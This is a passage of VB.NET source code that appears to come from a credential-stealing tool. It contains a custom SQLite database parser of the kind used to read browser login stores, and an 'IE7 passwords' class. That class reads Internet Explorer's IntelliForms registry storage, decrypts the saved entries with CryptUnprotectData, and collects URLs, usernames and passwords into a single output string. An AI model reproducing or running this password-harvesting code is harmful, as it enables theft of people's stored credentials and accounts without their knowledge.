    Private SQLDataTypeSize() As Byte = New Byte() {0, 1, 2, 3, 4, 6, 8, 8, 0, 0}
    Private table_entries() As table_entry
    Private field_names() As String

    Private Structure record_header_field
        Dim size As Int64
        Dim type As Int64
    End Structure

    Private Structure table_entry
        Dim row_id As Int64
        Dim content() As String
    End Structure

    Private Structure sqlite_master_entry
        Dim row_id As Int64
        Dim item_type As String
        Dim item_name As String
        Dim astable_name As String
        Dim root_num As Int64
        Dim sql_statement As String
    End Structure

    Private Function ToBigEndian16Bit(ByVal value As UInt16) As UInt16
        Return ((value And &HFF) << 8 Or (value And &HFF00) >> 8)
    End Function

    Private Function ToBigEndian32Bit(ByVal value As UInt32) As UInt32
        Return (value And &HFF) << 24 Or (value And &HFF00) << 8 Or (value And &HFF0000) >> 8 Or (value And &HFF000000) >> 24
    End Function

    Private Function ToBigEndian64Bit(ByVal value As UInt64) As UInt64
        Return (value And &HFFL) << 56 Or (value And &HFF00L) << 40 Or (value And &HFF0000L) << 24 Or (value And &HFF000000L) << 8 Or (value And &HFF00000000L) >> 8 Or (value And &HFF0000000000L) >> 24 Or (value And &HFF000000000000L) >> 40 Or (value And &HFF00000000000000L) >> 56
    End Function

    'Needs BigEndian
    'GetVariableLength
    ' returns the endindex of an variable length integer
    Private Function GVL(ByVal startIndex As Integer) As Integer
        If startIndex > db_bytes.Length Then Return Nothing

        For i = startIndex To startIndex + 8 Step 1
            If i > db_bytes.Length - 1 Then
                Return Nothing
            ElseIf (db_bytes(i) And &H80) <> &H80 Then
                Return i
            End If
        Next

        Return startIndex + 8
    End Function

    ' Eingaberichtung BigEndian
    ' ConvertVariableLength
    Private Function CVL(ByVal startIndex As Integer, ByVal endIndex As Integer) As Int64
        endIndex = endIndex + 1

        Dim retus(7) As Byte
        Dim Length = endIndex - startIndex
        Dim Bit64 As Boolean = False

        If Length = 0 Or Length > 9 Then Return Nothing
        If Length = 1 Then
            retus(0) = (db_bytes(startIndex) And &H7F)
            Return BitConverter.ToInt64(retus, 0)
        End If

        If Length = 9 Then
            ' Ein Byte wird n?mlich grad hinzugefügt
            Bit64 = True
        End If

        Dim j As Integer = 1
        Dim k As Integer = 7
        Dim y As Integer = 0

        If Bit64 Then
            retus(0) = db_bytes(endIndex - 1)
            endIndex = endIndex - 1
            y = 1
        End If

        For i = (endIndex - 1) To startIndex Step -1
            If (i - 1) >= startIndex Then
                retus(y) = ((db_bytes(i) >> (j - 1)) And (&HFF >> j)) Or (db_bytes(i - 1) << k)
                j = j + 1
                y = y + 1
                k = k - 1
            Else
                If Not Bit64 Then retus(y) = ((db_bytes(i) >> (j - 1)) And (&HFF >> j))
            End If
        Next

        Return BitConverter.ToInt64(retus, 0)
    End Function

    'Checks if a number is odd
    Private Function IsOdd(ByVal value As Int64) As Boolean
        Return (value And 1) = 1
    End Function

    'Big Endian Conversation
    Private Function ConvertToInteger(ByVal startIndex As Integer, ByVal Size As Integer) As UInt64
        If Size > 8 Or Size = 0 Then Return Nothing

        Dim retVal As UInt64 = 0

        For i = 0 To Size - 1 Step 1
            retVal = ((retVal << 8) Or db_bytes(startIndex + i))
        Next

        Return retVal
    End Function

    Private Sub ReadMasterTable(ByVal Offset As UInt64)

        If db_bytes(Offset) = &HD Then 'Leaf node
            'Length for setting the array length for the entries
            Dim Length As UInt16 = ToBigEndian16Bit(BitConverter.ToUInt16(db_bytes, Offset + 3)) - 1
            Dim ol As Integer = 0

            If Not master_table_entries Is Nothing Then
                ol = (master_table_entries.Length - 1)
                ReDim Preserve master_table_entries((master_table_entries.Length - 1) + Length)
            Else
                ReDim master_table_entries(Length)
            End If

            Dim ent_offset As UInt64

            For i = 0 To Length Step 1
                ent_offset = ToBigEndian16Bit(BitConverter.ToUInt16(db_bytes, Offset + 8 + (i * 2)))

                If Offset <> 100 Then ent_offset = ent_offset + Offset

                'Table Cell auslesen
                Dim t = GVL(ent_offset)
                Dim size As Int64 = CVL(ent_offset, t)

                Dim s = GVL(ent_offset + (t - ent_offset) + 1)
                master_table_entries(ol + i).row_id = CVL(ent_offset + (t - ent_offset) + 1, s)

                'Table Content
                'Resetting the offset
                ent_offset = ent_offset + (s - ent_offset) + 1

                'Now get to the Record Header
                t = GVL(ent_offset)
                s = t
                Dim Rec_Header_Size As Int64 = CVL(ent_offset, t) 'Record Header Length

                Dim Field_Size(4) As Int64

                'Now get the field sizes and fill in the Values
                For j = 0 To 4 Step 1
                    t = s + 1
                    s = GVL(t)
                    Field_Size(j) = CVL(t, s)

                    If Field_Size(j) > 9 Then
                        If IsOdd(Field_Size(j)) Then
                            Field_Size(j) = (Field_Size(j) - 13) / 2
                        Else
                            Field_Size(j) = (Field_Size(j) - 12) / 2
                        End If
                    Else
                        Field_Size(j) = SQLDataTypeSize(Field_Size(j))
                    End If
                Next

                ' Wir lesen nur unbedingt notwendige Sachen aus
                If encoding = 1 Then
                    master_table_entries(ol + i).item_type = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size, Field_Size(0))
                ElseIf encoding = 2 Then
                    master_table_entries(ol + i).item_type = System.Text.Encoding.Unicode.GetString(db_bytes, ent_offset + Rec_Header_Size, Field_Size(0))
                ElseIf encoding = 3 Then
                    master_table_entries(ol + i).item_type = System.Text.Encoding.BigEndianUnicode.GetString(db_bytes, ent_offset + Rec_Header_Size, Field_Size(0))
                End If
                If encoding = 1 Then
                    master_table_entries(ol + i).item_name = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0), Field_Size(1))
                ElseIf encoding = 2 Then
                    master_table_entries(ol + i).item_name = System.Text.Encoding.Unicode.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0), Field_Size(1))
                ElseIf encoding = 3 Then
                    master_table_entries(ol + i).item_name = System.Text.Encoding.BigEndianUnicode.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0), Field_Size(1))
                End If
                'master_table_entries(ol + i).astable_name = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1), Field_Size(2))
                master_table_entries(ol + i).root_num = ConvertToInteger(ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1) + Field_Size(2), Field_Size(3))
                If encoding = 1 Then
                    master_table_entries(ol + i).sql_statement = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1) + Field_Size(2) + Field_Size(3), Field_Size(4))
                ElseIf encoding = 2 Then
                    master_table_entries(ol + i).sql_statement = System.Text.Encoding.Unicode.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1) + Field_Size(2) + Field_Size(3), Field_Size(4))
                ElseIf encoding = 3 Then
                    master_table_entries(ol + i).sql_statement = System.Text.Encoding.BigEndianUnicode.GetString(db_bytes, ent_offset + Rec_Header_Size + Field_Size(0) + Field_Size(1) + Field_Size(2) + Field_Size(3), Field_Size(4))
                End If
            Next
        ElseIf db_bytes(Offset) = &H5 Then 'internal node
            Dim Length As UInt16 = ToBigEndian16Bit(BitConverter.ToUInt16(db_bytes, Offset + 3)) - 1
            Dim ent_offset As UInt16

            For i = 0 To Length Step 1
                ent_offset = ToBigEndian16Bit(BitConverter.ToUInt16(db_bytes, Offset + 12 + (i * 2)))

                If Offset = 100 Then
                    ReadMasterTable((ConvertToInteger(ent_offset, 4) - 1) * page_size)
                Else
                    ReadMasterTable((ConvertToInteger(Offset + ent_offset, 4) - 1) * page_size)
                End If

            Next

            ReadMasterTable((ConvertToInteger(Offset + 8, 4) - 1) * page_size)
        End If
    End Sub

    Private Function ReadTableFromOffset(ByVal Offset As UInt64) As Boolean
        If db_bytes(Offset) = &HD Then 'Leaf node
            'Length for setting the array length for the entries
            Dim Length As UInt16 = ToBigEndian16Bit(BitConverter.ToUInt16(db_bytes, Offset + 3)) - 1
            Dim ol As Integer = 0

            If Not table_entries Is Nothing Then
                ol = table_entries.Length - 1
                ReDim Preserve table_entries((table_entries.Length - 1) + Length)
            Else
                ReDim table_entries(Length)
            End If

            Dim ent_offset As UInt64

            For i = 0 To Length Step 1
                ent_offset = ToBigEndian16Bit(BitConverter.ToUInt16(db_bytes, Offset + 8 + (i * 2)))

                If Offset <> 100 Then ent_offset = ent_offset + Offset

                'Table Cell auslesen
                Dim t = GVL(ent_offset)
                Dim size As Int64 = CVL(ent_offset, t)

                Dim s = GVL(ent_offset + (t - ent_offset) + 1)
                table_entries(ol + i).row_id = CVL(ent_offset + (t - ent_offset) + 1, s)

                'Table Content
                'Resetting the offset
                ent_offset = ent_offset + (s - ent_offset) + 1

                'Now get to the Record Header
                t = GVL(ent_offset)
                s = t
                Dim Rec_Header_Size As Int64 = CVL(ent_offset, t) 'Record Header Length

                Dim Field_Size() As record_header_field
                Dim size_read As Int64 = (ent_offset - t) + 1
                Dim j = 0

                'Now get the field sizes and fill in the Values
                While size_read < Rec_Header_Size
                    ReDim Preserve Field_Size(j)

                    t = s + 1
                    s = GVL(t)
                    Field_Size(j).type = CVL(t, s)

                    If Field_Size(j).type > 9 Then
                        If IsOdd(Field_Size(j).type) Then
                            Field_Size(j).size = (Field_Size(j).type - 13) / 2
                        Else
                            Field_Size(j).size = (Field_Size(j).type - 12) / 2
                        End If
                    Else
                        Field_Size(j).size = SQLDataTypeSize(Field_Size(j).type)
                    End If

                    size_read = size_read + (s - t) + 1
                    j = j + 1
                End While

                ReDim table_entries(ol + i).content(Field_Size.Length - 1)
                Dim counter As Integer = 0

                For k = 0 To Field_Size.Length - 1 Step 1
                    If Field_Size(k).type > 9 Then
                        If Not IsOdd(Field_Size(k).type) Then
                            If encoding = 1 Then
                                table_entries(ol + i).content(k) = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size + counter, Field_Size(k).size)
                            ElseIf encoding = 2 Then
                                table_entries(ol + i).content(k) = System.Text.Encoding.Unicode.GetString(db_bytes, ent_offset + Rec_Header_Size + counter, Field_Size(k).size)
                            ElseIf encoding = 3 Then
                                table_entries(ol + i).content(k) = System.Text.Encoding.BigEndianUnicode.GetString(db_bytes, ent_offset + Rec_Header_Size + counter, Field_Size(k).size)
                            End If
                        Else
                            table_entries(ol + i).content(k) = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size + counter, Field_Size(k).size)
                        End If
                    Else
                        table_entries(ol + i).content(k) = CStr(ConvertToInteger(ent_offset + Rec_Header_Size + counter, Field_Size(k).size))
                    End If

                    counter = counter + Field_Size(k).size
                Next
            Next
        ElseIf db_bytes(Offset) = &H5 Then 'internal node
            Dim Length As UInt16 = ToBigEndian16Bit(BitConverter.ToUInt16(db_bytes, Offset + 3)) - 1
            Dim ent_offset As UInt16

            For i = 0 To Length Step 1
                ent_offset = ToBigEndian16Bit(BitConverter.ToUInt16(db_bytes, Offset + 12 + (i * 2)))

                ReadTableFromOffset((ConvertToInteger(Offset + ent_offset, 4) - 1) * page_size)
            Next

            ReadTableFromOffset((ConvertToInteger(Offset + 8, 4) - 1) * page_size)
        End If

        Return True
    End Function

    ' Reads a complete table with all entries in it
    Public Function ReadTable(ByVal TableName As String) As Boolean
        ' First loop through sqlite_master and look if table exists
        Dim found As Integer = -1

        For i = 0 To master_table_entries.Length Step 1
            If master_table_entries(i).item_name.ToLower().CompareTo(TableName.ToLower()) = 0 Then
                found = i
                Exit For
            End If
        Next

        If found = -1 Then Return False

        Dim fields() = master_table_entries(found).sql_statement.Substring(master_table_entries(found).sql_statement.IndexOf("(") + 1).Split(",")

        For i = 0 To fields.Length - 1 Step 1
            fields(i) = LTrim(fields(i))

            Dim index = fields(i).IndexOf(" ")

            If index > 0 Then fields(i) = fields(i).Substring(0, index)

            If fields(i).IndexOf("UNIQUE") = 0 Then
                Exit For
            Else
                ReDim Preserve field_names(i)
                field_names(i) = fields(i)
            End If
        Next

        Return ReadTableFromOffset((master_table_entries(found).root_num - 1) * page_size)
    End Function

    ' Returns the row count of current table
    Public Function GetRowCount() As Integer
        Return table_entries.Length
    End Function

    ' Returns a Value from current table in row row_num with field number field
    Public Function GetValue(ByVal row_num As Integer, ByVal field As Integer) As String
        If row_num >= table_entries.Length Then Return Nothing
        If field >= table_entries(row_num).content.Length Then Return Nothing

        Return table_entries(row_num).content(field)
    End Function

    ' Returns a Value from current table in row row_num with field name field
    Public Function GetValue(ByVal row_num As Integer, ByVal field As String) As String
        Dim found As Integer = -1

        For i = 0 To field_names.Length Step 1
            If field_names(i).ToLower().CompareTo(field.ToLower()) = 0 Then
                found = i
                Exit For
            End If
        Next

        If found = -1 Then Return Nothing

        Return GetValue(row_num, found)
    End Function

    ' Returns a String-Array with all Tablenames
    Public Function GetTableNames() As String()
        Dim retVal As String()
        Dim arr = 0

        For i = 0 To master_table_entries.Length - 1 Step 1
            If master_table_entries(i).item_type = "table" Then
                ReDim Preserve retVal(arr)
                retVal(arr) = master_table_entries(i).item_name
                arr = arr + 1
            End If
        Next
        Return retVal
    End Function

    ' Constructor
    Public Sub New(ByVal baseName As String)
        'Page Number n is page_size*(n-1)
        If File.Exists(baseName) Then
            FileOpen(1, baseName, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
            Dim asi As String = Space(LOF(1))
            FileGet(1, asi)
            FileClose(1)

            db_bytes = System.Text.Encoding.Default.GetBytes(asi)

            If System.Text.Encoding.Default.GetString(db_bytes, 0, 15).CompareTo("SQLite format 3") <> 0 Then
                '   Throw New Exception("Not a valid SQLite 3 Database File")
                Exit Sub
            End If

            If db_bytes(52) <> 0 Then
                '  Throw New Exception("Auto-vacuum capable database is not supported")
                Exit Sub
            ElseIf ToBigEndian32Bit(BitConverter.ToInt32(db_bytes, 44)) >= 4 Then
                '  Throw New Exception("No supported Schema layer file-format")
                Exit Sub
            End If

            page_size = ConvertToInteger(16, 2)
            encoding = ConvertToInteger(56, 4)

            If encoding = 0 Then encoding = 1

            'Now we read the sqlite_master table
            'Offset is 100 in first page
            ReadMasterTable(100)
        End If
    End Sub
End Class
#End Region
#Region "IE"
Friend Class CIE7Passwords
    Private Const ERROR_CACHE_FIND_FAIL As Integer = 0
    Private Const ERROR_CACHE_FIND_SUCCESS As Integer = 1
    Private Const MAX_PATH As Integer = 260
    Private Const MAX_CACHE_ENTRY_INFO_SIZE As Integer = 4096
    Private Const NORMAL_CACHE_ENTRY As Integer = &H1S
    Private Const URLHISTORY_CACHE_ENTRY As Integer = &H200000
    Private Structure SYSTEMTIME
        Dim wYear As Short
        Dim wMonth As Short
        Dim wDayOfWeek As Short
        Dim wDay As Short
        Dim wHour As Short
        Dim wMinute As Short
        Dim wSecond As Short
        Dim wMilliseconds As Short
    End Structure
    Private Structure INTERNET_CACHE_ENTRY_INFO
        Dim dwStructSize As Integer
        Dim lpszSourceUrlName As Integer
        Dim lpszLocalFileName As Integer
        Dim CacheEntryType As Integer
        Dim dwUseCount As Integer
        Dim dwHitRate As Integer
        Dim dwSizeLow As Integer
        Dim dwSizeHigh As Integer
        Dim LastModifiedTime As FILETIME
        Dim ExpireTime As FILETIME
        Dim LastAccessTime As FILETIME
        Dim LastSyncTime As FILETIME
        Dim lpHeaderInfo As Integer
        Dim dwHeaderInfoSize As Integer
        Dim lpszFileExtension As Integer
        Dim dwExemptDelta As Integer
    End Structure
    Private Declare Function FindFirstUrlCacheEntry Lib "wininet.dll" Alias "FindFirstUrlCacheEntryA" (ByVal lpszUrlSearchPattern As String, ByVal lpFirstCacheEntryInfo As IntPtr, ByRef lpdwFirstCacheEntryInfoBufferSize As Integer) As Integer
    Private Declare Function FindNextUrlCacheEntry Lib "wininet.dll" Alias "FindNextUrlCacheEntryA" (ByVal hEnum As Integer, ByVal lpFirstCacheEntryInfo As IntPtr, ByRef lpdwFirstCacheEntryInfoBufferSize As Integer) As Integer
    Private Declare Function FindCloseUrlCache Lib "wininet.dll" (ByVal hEnumHandle As Integer) As Integer
    Private Declare Function lstrlenA Lib "kernel32.dll" (ByVal lpString As IntPtr) As Integer
    Private Declare Function lstrcpyA Lib "kernel32.dll" (ByVal RetVal As String, ByVal ptr As Integer) As Integer
    Private Const PROV_RSA_FULL As Integer = 1
    Private Const ALG_CLASS_HASH As Integer = (4 * CLng(2 ^ 13))
    Private Const ALG_TYPE_ANY As Integer = 0
    Private Const ALG_SID_SHA As Integer = 4
    Private Const CALG_SHA As Integer = (ALG_CLASS_HASH Or ALG_TYPE_ANY Or ALG_SID_SHA)
    Private Const AT_SIGNATURE As Integer = 2
    Private Declare Function CryptAcquireContext Lib "advapi32.dll" Alias "CryptAcquireContextA" (ByRef phProv As Integer, ByVal pszContainer As Integer, ByVal pszProvider As String, ByVal dwProvType As Integer, ByVal dwFlags As Integer) As Integer
    Private Declare Function CryptCreateHash Lib "advapi32.dll" (ByVal hProv As Integer, ByVal Algid As Integer, ByVal hKey As Integer, ByVal dwFlags As Integer, ByRef phHash As Integer) As Integer
    Private Declare Function CryptHashData Lib "advapi32.dll" (ByVal hHash As Integer, ByVal pbData As IntPtr, ByVal dwDataLen As Integer, ByVal dwFlags As Integer) As Integer
    Private Const HP_HASHVAL As Integer = &H2S
    Private Declare Function CryptGetHashParam Lib "advapi32.dll" (ByVal hHash As Integer, ByVal dwParam As Integer, ByVal pByte As IntPtr, ByRef pdwDataLen As Integer, ByVal dwFlags As Integer) As Integer
    Private Declare Function CryptGetHashParam Lib "advapi32.dll" (ByVal hHash As Integer, ByVal dwParam As Integer, <MarshalAs(UnmanagedType.LPArray)> ByRef pByte() As Byte, ByRef pdwDataLen As Integer, ByVal dwFlags As Integer) As Integer
    Private Declare Function CryptSignHash Lib "advapi32.dll" Alias "CryptSignHashA" (ByVal hHash As Integer, ByVal dwKeySpec As Integer, ByVal sDescription As Integer, ByVal dwFlags As Integer, ByVal pbSignature As Integer, ByRef pdwSigLen As Integer) As Integer
    Private Declare Function CryptDestroyHash Lib "advapi32.dll" (ByVal hHash As Integer) As Integer
    Private Declare Function CryptReleaseContext Lib "advapi32.dll" (ByVal hProv As Integer, ByVal dwFlags As Integer) As Integer
    Private Const READ_CONTROL As Integer = &H20000
    Private Const STANDARD_RIGHTS_READ As Integer = (READ_CONTROL)
    Private Const KEY_QUERY_VALUE As Integer = &H1S
    Private Const KEY_ENUMERATE_SUB_KEYS As Integer = &H8S
    Private Const KEY_NOTIFY As Integer = &H10S
    Private Const SYNCHRONIZE As Integer = &H100000
    Private Const STANDARD_RIGHTS_WRITE As Integer = (READ_CONTROL)
    Private Const KEY_SET_VALUE As Integer = &H2S
    Private Const KEY_CREATE_SUB_KEY As Integer = &H4S
    Private Const KEY_READ As Integer = ((STANDARD_RIGHTS_READ Or KEY_QUERY_VALUE Or KEY_ENUMERATE_SUB_KEYS Or KEY_NOTIFY) And (Not SYNCHRONIZE))
    Private Const KEY_WRITE As Integer = ((STANDARD_RIGHTS_WRITE Or KEY_SET_VALUE Or KEY_CREATE_SUB_KEY) And (Not SYNCHRONIZE))
    Private Const HKEY_CURRENT_USER As Integer = &H80000001
    Private Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hKey As Integer, ByVal lpSubKey As String, ByVal ulOptions As Integer, ByVal samDesired As Integer, ByRef phkResult As Integer) As Integer
    Private Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Integer, ByVal lpValueName As String, ByVal lpReserved As Integer, ByRef lpType As Integer, ByVal lpData As IntPtr, ByRef lpcbData As Integer) As Integer
    Private Declare Function RegDeleteValue Lib "advapi32.dll" Alias "RegDeleteValueA" (ByVal hKey As Integer, ByVal lpValueName As String) As Integer
    Private Declare Function LocalFree Lib "kernel32.dll" (ByVal hMem As Integer) As Integer
    Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Integer) As Integer
    Private Structure DATA_BLOB
        Dim cbData As Integer
        Dim pbData As Integer
    End Structure
    Private Declare Function CryptUnprotectData Lib "crypt32.dll" (ByRef pDataIn As DATA_BLOB, ByVal ppszDataDescr As Integer, ByVal pOptionalEntropy As IntPtr, ByVal pvReserved As Integer, ByVal pPromptStruct As Integer, ByVal dwFlags As Integer, ByRef pDataOut As DATA_BLOB) As Integer
    Private Declare Function CryptUnprotectData Lib "crypt32.dll" (ByRef pDataIn As DATA_BLOB, ByVal ppszDataDescr As Integer, ByRef pOptionalEntropy As DATA_BLOB, ByVal pvReserved As Integer, ByVal pPromptStruct As Integer, ByVal dwFlags As Integer, ByRef pDataOut As DATA_BLOB) As Integer
    Private Structure StringIndexHeader
        Dim dwWICK As Integer 'semble être une signature de la structure : "WICK"
        Dim dwStructSize As Integer 'taille de la structure d'entête (&h18)
        Dim dwEntriesCount As Integer 'nombre d'entrée suivant le structure
        Dim dwUnkId As Integer 'semble être un identifiant des données
        Dim dwType As Integer 'semble être le type de données :
        Dim dwUnk As Integer 'pourrait être un emplacement dans le structure pour mettre un pointeur vers la première entrée suivant cette structure
    End Structure
    Private Structure StringIndexEntry
        Dim dwDataOffset As Integer 'décalage depuis le début des données StringData
        Dim ftInsertDateTime As FILETIME 'date d'ajout de la donnée dans la liste pour le formulaire ou le champ
        Dim dwDataSize As Integer ' taille de la donnée pour le champ ou le formulaire
    End Structure
    Private Enum CRED_TYPE
        GENERIC = 1
        DOMAIN_PASSWORD
        DOMAIN_CERTIFICATE
        DOMAIN_VISIBLE_PASSWORD
        MAXIMUM
    End Enum
    Private Structure CREDENTIAL_ATTRIBUTE
        Dim lpstrKeyword As Integer
        Dim dwFlags As Integer
        Dim dwValueSize As Integer
        Dim lpbValue As Integer
    End Structure
    Private Structure CREDENTIAL
        Dim dwFlags As Integer
        Dim dwType As Integer
        Dim lpstrTargetName As Integer
        Dim lpstrComment As Integer
        Dim ftLastWritten As FILETIME
        Dim dwCredentialBlobSize As Integer
        Dim lpbCredentialBlob As Integer
        Dim dwPersist As Integer
        Dim dwAttributeCount As Integer
        Dim lpAttributes As Integer 'PCREDENTIAL_ATTRIBUTE
        Dim lpstrTargetAlias As Integer
        Dim lpUserName As Integer
    End Structure
    Private Declare Function CredEnumerate Lib "advapi32.dll" Alias "CredEnumerateW" (<MarshalAs(UnmanagedType.LPWStr)> ByVal lpszFilter As String, ByVal lFlags As Integer, ByRef pCount As Integer, ByRef lppCredentials As Integer) As Integer
    Private Declare Function CredDelete Lib "advapi32.dll" Alias "CredDeleteW" (<MarshalAs(UnmanagedType.LPWStr)> ByVal lpwstrTargetName As String, ByVal dwType As Integer, ByVal dwFlags As Integer) As Integer
    Private Declare Function CredFree Lib "advapi32.dll" (ByVal pBuffer As Integer) As Integer
    Private Declare Function SysAllocString Lib "oleaut32.dll" (ByVal pOlechar As Integer) As String
    Private Function GetStrFromPtrA(ByVal lpszA As IntPtr) As String
        Return Marshal.PtrToStringAnsi(lpszA)
    End Function
    Private Function CheckSum(ByRef s As String) As Byte
        Dim i As Integer
        Dim sum As Integer
        sum = 0
        For i = 1 To Len(s) Step 2
            sum = sum + CInt(Val("&H" & Mid(s, i, 2)))
        Next
        CheckSum = CByte(sum Mod 256)
    End Function
    Private Function GetSHA1Hash(ByRef pbData() As Byte) As String
        Dim buff() As Byte
        Dim i As Integer
        ReDim Preserve pbData(pbData.Length + 1)
        buff = System.Security.Cryptography.SHA1.Create().ComputeHash(pbData)
        GetSHA1Hash = ""
        For i = 0 To buff.Length - 1
            GetSHA1Hash = GetSHA1Hash & Right("00" & Hex(buff(i)), 2)
        Next
    End Function
    Private Sub ProcessIEPass(ByVal strURL As String, ByVal strHash As String, ByVal dataOut As DATA_BLOB)
        Dim k As Integer 'index
        Dim ptrData, ptrEntry As IntPtr
        Dim hIndex As StringIndexHeader
        Dim cbhIndex, cbentry As Integer
        Dim eIndex As StringIndexEntry
        Dim strUserName, strPasswd As String
        Dim ptr As IntPtr
        cbentry = Len(eIndex)
        cbhIndex = Len(hIndex)
        ptr = New IntPtr(dataOut.pbData + Marshal.ReadByte(New IntPtr(dataOut.pbData)))
        hIndex = CType(Marshal.PtrToStructure(ptr, hIndex.GetType()), StringIndexHeader)
        If hIndex.dwType = 1 Then 'passwd
            If hIndex.dwEntriesCount >= 2 Then
                ptrEntry = New IntPtr(ptr.ToInt32 + hIndex.dwStructSize)
                ptrData = New IntPtr(ptrEntry.ToInt32() + hIndex.dwEntriesCount * cbentry)
                For i As Integer = 0 To hIndex.dwEntriesCount - 1 Step 2
                    If ptrData = IntPtr.Zero Or ptrEntry = IntPtr.Zero Then Exit Sub
                    eIndex = CType(Marshal.PtrToStructure(ptrEntry, eIndex.GetType()), StringIndexEntry)
                    If lstrlenA(New IntPtr(ptrData.ToInt32 + eIndex.dwDataOffset)) <> eIndex.dwDataSize Then 'UNICODE
                        strUserName = Marshal.PtrToStringUni(New IntPtr(ptrData.ToInt32 + eIndex.dwDataOffset))
                    Else 'ANSI
                        strUserName = Marshal.PtrToStringAnsi(New IntPtr(ptrData.ToInt32 + eIndex.dwDataOffset))
                    End If
                    ptrEntry = New IntPtr(ptrEntry.ToInt32 + cbentry)
                    eIndex = CType(Marshal.PtrToStructure(ptrEntry, eIndex.GetType()), StringIndexEntry)
                    strPasswd = Space(eIndex.dwDataSize)
                    If lstrlenA(New IntPtr(ptrData.ToInt32 + eIndex.dwDataOffset)) <> eIndex.dwDataSize Then 'UNICODE
                        strPasswd = Marshal.PtrToStringUni(New IntPtr(ptrData.ToInt32 + eIndex.dwDataOffset))
                    Else 'ANSI
                        strPasswd = Marshal.PtrToStringAnsi(New IntPtr(ptrData.ToInt32 + eIndex.dwDataOffset))
                    End If
                    ptrEntry = New IntPtr(ptrEntry.ToInt32 + cbentry)
                    OL += "|URL| " & strURL & vbNewLine & "|USR| " & strUserName & vbNewLine & "|PWD| " & strPasswd & vbNewLine

                Next
            End If
        ElseIf hIndex.dwType = 0 Then  'champ
            strPasswd = vbNullString
            ptrEntry = New IntPtr(ptr.ToInt32 + hIndex.dwStructSize)
            ptrData = New IntPtr(ptrEntry.ToInt32() + hIndex.dwEntriesCount * cbentry)
            If ptrData = IntPtr.Zero Or ptrEntry = IntPtr.Zero Then Exit Sub
            For k = 0 To hIndex.dwEntriesCount - 1
                eIndex = CType(Marshal.PtrToStructure(ptrEntry, eIndex.GetType()), StringIndexEntry)
                strUserName = Space(eIndex.dwDataSize)
                If lstrlenA(New IntPtr(ptrData.ToInt32() + eIndex.dwDataOffset)) <> eIndex.dwDataSize Then 'UNICODE
                    strUserName = Marshal.PtrToStringUni(New IntPtr(ptrData.ToInt32() + eIndex.dwDataOffset))
                Else 'ANSI
                    strUserName = Marshal.PtrToStringAnsi(New IntPtr(ptrData.ToInt32() + eIndex.dwDataOffset))
                End If
                ptrEntry = New IntPtr(ptrEntry.ToInt32() + cbentry)
                OL += "|URL| " & strURL & vbNewLine & "|USR| " & strUserName & vbNewLine & "|PWD| " & strPasswd & vbNewLine

            Next
        End If
    End Sub
    Private Sub AddPasswdInfo(ByVal strRess As String, ByVal hKey As Integer)
        Dim strHash As String
        Dim dwType, ret, cbData As Integer
        Dim dataOut, dataIn, Entropy As DATA_BLOB
        strRess = LCase(strRess)
        strHash = GetSHA1Hash(System.Text.UnicodeEncoding.Unicode.GetBytes(strRess))
        strHash = strHash & Right("00" & Hex(CheckSum(strHash)), 2)
        ret = RegQueryValueEx(hKey, strHash, 0, dwType, IntPtr.Zero, cbData)
        If cbData > 0 Then
            Dim ptrData As IntPtr = Marshal.AllocHGlobal(cbData)
            ret = RegQueryValueEx(hKey, strHash, 0, dwType, ptrData, cbData)
            dataIn.cbData = cbData
            dataIn.pbData = ptrData.ToInt32
            Entropy.cbData = Len(strRess) * 2 + 2
            Entropy.pbData = Marshal.StringToHGlobalUni(strRess).ToInt32
            Call CryptUnprotectData(dataIn, 0, Entropy, 0, 0, 0, dataOut)
            ProcessIEPass(strRess, strHash, dataOut)
            Marshal.FreeHGlobal(New IntPtr(Entropy.pbData))
            LocalFree(dataOut.pbData)
        End If
    End Sub
    Protected Function CopyString(ByVal ptr As IntPtr) As String
        Return Marshal.PtrToStringUni(ptr)
    End Function
    Public Sub Refresh()
        Try
            ' OL += vbNewLine & "###IE" & vbNewLine
            Dim i As Integer
            Dim hFile As Integer
            Dim dwSize As Integer
            Dim ptr As IntPtr
            Dim centry As INTERNET_CACHE_ENTRY_INFO
            Dim hKey1 As Integer
            Dim hKey2 As Integer
            Dim url As String
            Dim nameRegex As New System.Text.RegularExpressions.Regex("name=""([^""]+)""", System.Text.RegularExpressions.RegexOptions.Compiled)
            RegOpenKeyEx(HKEY_CURRENT_USER, "Software\Microsoft\Internet Explorer\IntelliForms\Storage1", 0, KEY_READ, hKey1)
            RegOpenKeyEx(HKEY_CURRENT_USER, "Software\Microsoft\Internet Explorer\IntelliForms\Storage2", 0, KEY_READ, hKey2)
            If hKey2 <> 0 OrElse hKey1 <> 0 Then
                hFile = FindFirstUrlCacheEntry(vbNullString, IntPtr.Zero, dwSize)
                If dwSize > 0 Then
                    ptr = Marshal.AllocHGlobal(dwSize)
                    Marshal.WriteInt32(ptr, dwSize)
                    hFile = FindFirstUrlCacheEntry(vbNullString, ptr, dwSize)
                    Do
                        centry = CType(Marshal.PtrToStructure(ptr, centry.GetType()), INTERNET_CACHE_ENTRY_INFO)
                        If (centry.CacheEntryType And (NORMAL_CACHE_ENTRY Or URLHISTORY_CACHE_ENTRY)) <> 0 Then
                            url = GetStrFromPtrA(New IntPtr(centry.lpszSourceUrlName))
                            If url.IndexOf("?") >= 0 Then url = url.Substring(0, url.IndexOf("?"))
                            If (InStr(url, "@") > 0) Then url = Mid(url, InStr(url, "@") + 1)
                            If hKey1 <> 0 AndAlso (centry.CacheEntryType And NORMAL_CACHE_ENTRY) = NORMAL_CACHE_ENTRY Then
